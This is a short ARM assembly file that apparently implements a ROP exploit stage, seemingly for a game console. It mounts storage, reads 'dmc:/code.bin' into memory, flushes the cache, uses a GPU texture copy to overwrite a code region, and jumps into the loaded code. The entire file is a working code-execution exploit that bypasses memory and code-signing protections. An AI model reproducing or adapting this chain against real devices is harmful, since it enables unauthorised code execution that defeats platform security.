	.arm
	.text

#include "rop.h"

#define BUFFER_LOC 0x18410000
#define CODE_SIZE 0x00004000

	.global	_start
@---------------------------------------------------------------------------------
_start:
	rop_fs_mount(DMC)
	rop_file_open(THIS, FileName, FILE_READ)
	rop_file_read(THIS, THIS+0x20, BUFFER_LOC, CODE_SIZE)
	rop_flush_data_cache(HANDLE_PTR, KPROCESS_HANDLE, BUFFER_LOC, CODE_SIZE)
	rop_gx_texture_copy(BUFFER_LOC, CODE_TARGET, CODE_SIZE)
@	rop_gx_command(gxCommand)
	rop_sleep(1000000000)
	rop_jump_arm
@gxCommand:
@	rop_gx_texture_copy(BUFFER_LOC, CODE_TARGET, CODE_SIZE)
FileName:
	.string16 "dmc:/code.bin"
